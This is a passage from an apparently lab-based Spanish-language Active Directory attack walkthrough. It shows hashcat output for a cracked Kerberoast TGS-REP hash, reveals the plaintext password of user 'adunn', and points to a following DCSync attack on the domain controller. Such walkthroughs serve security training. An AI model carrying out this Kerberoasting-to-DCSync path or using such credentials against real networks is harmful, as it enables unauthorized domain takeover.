Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/L...e89659
Time.Started.....: Thu Jul 18 15:19:14 2024 (6 secs)
Time.Estimated...: Thu Jul 18 15:19:20 2024 (0 secs)
```

{% endcode %}

Bum!! Obtenemos la contraseña en plano de adunn `SyncMaster757`, lo que nos permite hacer un ataque DCSync contra el controlador de dominio.

***

En la siguiente sección, analizaremos el ataque DCSync, que es el resultado de la ruta de ataque que acabamos de analizar y es una forma común de lograr la vulneración del dominio.
